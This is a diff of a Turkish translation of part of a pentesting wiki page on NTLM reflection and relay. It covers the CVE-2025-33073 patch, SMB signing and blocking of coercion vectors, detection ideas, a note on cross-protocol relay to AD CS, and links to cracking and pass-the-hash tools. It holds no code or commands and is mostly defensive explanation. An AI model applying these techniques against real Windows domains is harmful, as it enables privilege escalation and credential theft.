-* **CVE-2025-33073** için KB yaması, `mrxsmb.sys::SmbCeCreateSrvCall` içine `CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER` olduğunda marshalled info içeren herhangi bir SMB bağlantısını engelleyen bir kontrol ekler.<sup>[[5]](#references)[[6]](#references)</sup>
-* SMB relay hedeflerinde **SMB signing** uygulayın. Diğer hedefler için ilgili protokolün kendi signing veya Extended Protection gereksinimlerini ve yama düzeyini değerlendirin; yalnızca SMB signing, HTTPS WinRM relay'in mümkün olup olmadığını belirlemez.
-* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve zorlama vektörlerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.
+### Yamalar ve Azaltma Yöntemleri
+* **CVE-2025-33073** için KB yaması, `mrxsmb.sys::SmbCeCreateSrvCall` içinde `CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER` olduğunda, hedefi marshalled info içeren tüm SMB bağlantılarını engelleyen bir kontrol ekler.<sup>[[5]](#references)[[6]](#references)</sup>
+* SMB relay hedeflerinde **SMB signing** zorunlu kılın. Diğer hedeflerde, ilgili protokolün kendi signing veya Extended Protection gereksinimlerini ve yama düzeyini değerlendirin; tek başına SMB signing, HTTPS WinRM relay işleminin mümkün olup olmadığını belirlemez.
+* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve coercion vektörlerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.
 
 ### Tespit fikirleri
-* İstemci IP'sinin sunucu IP'sine eşit olmadığı `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren ağ yakalamaları.
-* Bir subsession key içeren ve istemci principal'ı ana bilgisayar adına eşit olan Kerberos AP-REQ.
-* Aynı ana bilgisayardan gelen uzak SMB yazmalarının hemen öncesinde görülen Windows Event 4624/4648 SYSTEM oturum açma olayları.<sup>[[5]](#references)</sup>
+* İstemci IP'si ≠ sunucu IP'si olan `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren ağ yakalamaları.
+* Bir subsession key içeren ve istemci principal'ı hostname'e eşit olan Kerberos AP-REQ.
+* Windows Event 4624/4648 SYSTEM oturum açma olaylarının hemen ardından aynı host'tan gelen uzak SMB yazma işlemleri.<sup>[[5]](#references)</sup>
 
-Serileştirilmiş bir target-information DNS adı, zorlanmış kimlik doğrulamasını AD CS web-enrollment uç noktasına yönelik **protokoller arası relay** için bir saldırgana yönlendirebilir. Bu, aynı ana makinedeki reflection'dan farklı bir sonuçtur: [ESC8 kayıt koşulları](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS yazma hakları, zorlama yolu ve hedefin yama düzeyi birbirinden bağımsız olarak değerlendirilmelidir.
+Serileştirilmiş bir target-information DNS adı, zorlanmış kimlik doğrulamasını AD CS web-enrollment endpoint'ine yönelik **cross-protocol relay** için bir saldırgana da yönlendirebilir. Bu, aynı host'a yönelik reflection'dan ayrı bir sonuçtur: [ESC8 kayıt koşulları](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS yazma hakları, bir coercion yolu ve hedefin yama düzeyi birbirinden bağımsız olarak değerlendirilmelidir.
 
-**NT AUTHORITY\SYSTEM** erişimi elde etmek için **SMB rastgele portlarını** ve **TCP bağlantı yeniden kullanımını** kötüye kullanan **Mart 2026** yerel reflection çeşidi için bkz.:
+**SMB arbitrary ports** ve **TCP connection reuse** yöntemlerini kullanarak `NT AUTHORITY\SYSTEM` erişimi sağlayan **March 2026** local reflection varyantı için bkz.:
 
 {{#ref}}
 ../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
@@ -353,9 +353,9 @@ Serileştirilmiş bir target-information DNS adı, zorlanmış kimlik doğrulama
 ## References
 - [1] [evilmog/ntlmv1-multi – NTLMv1 Çok Amaçlı Araç](https://github.com/evilmog/ntlmv1-multi)
 - [2] [Hashcat örnek hash'leri – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash yardımcı programları](https://github.com/Kevin-Robertson/Invoke-TheHash)
+- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash yardımcı araçları](https://github.com/Kevin-Robertson/Invoke-TheHash)
 - [4] [Internal Monologue Attack: LSASS'e Dokunmadan NTLM Hash'lerini Alma](https://github.com/eladshamir/Internal-Monologue)
-- [5] [NTLM Reflection Öldü, Yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
+- [5] [NTLM Reflection öldü, yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
 - [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 - [7] [NTLMv2 Hash'ini Kırma – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 {{#include ../../banners/hacktricks-training.md}}
